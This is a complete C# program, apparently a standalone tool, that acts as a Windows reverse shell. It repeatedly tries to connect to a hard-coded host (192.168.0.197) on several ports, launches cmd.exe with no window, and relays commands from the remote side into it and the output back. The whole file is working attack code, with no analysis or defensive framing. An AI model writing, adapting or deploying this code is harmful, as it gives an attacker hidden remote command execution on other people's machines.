using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace apollo
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			TcpClient client = null;
			String host = "192.168.0.197";
			int[] ports = new int[] { 8080, 8081, 51251 };
		Connect:
			client = null;
			Random r = new Random();
			while (client == null) { 
			foreach (int port in ports.OrderBy(x => r.Next()))
			{
				try
				{
					Console.WriteLine("trying to conenct to {0}:{1}.", host, port);
					client = new TcpClient(host, port);
					break;
				}
				catch
				{
					Console.WriteLine("Conenction to {0}:{1} failed.", host, port);
				}
			}
			}

			using (Stream stream = client.GetStream())
			{
				using (StreamReader rdr = new StreamReader(stream))
				{
					streamWriter = new StreamWriter(stream);

					StringBuilder strInput = new StringBuilder();

					Process p = new Process();
					p.StartInfo.FileName = "cmd.exe";
					p.StartInfo.CreateNoWindow = true;
					p.StartInfo.UseShellExecute = false;
					p.StartInfo.RedirectStandardOutput = true;
					p.StartInfo.RedirectStandardInput = true;
					p.StartInfo.RedirectStandardError = true;
					p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
					p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
					p.Start();
					p.BeginOutputReadLine();
					p.BeginErrorReadLine();

					while (true)
					{
						try
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
						catch {
							Console.WriteLine("Connected to application other than netcat, trying again...");
							goto Connect;
						}
					}
				}
			}
			client.Close();

		}
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();
			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception) { }
			}
		}

		private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();
			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception) { }
			}
		}
	}
}

		
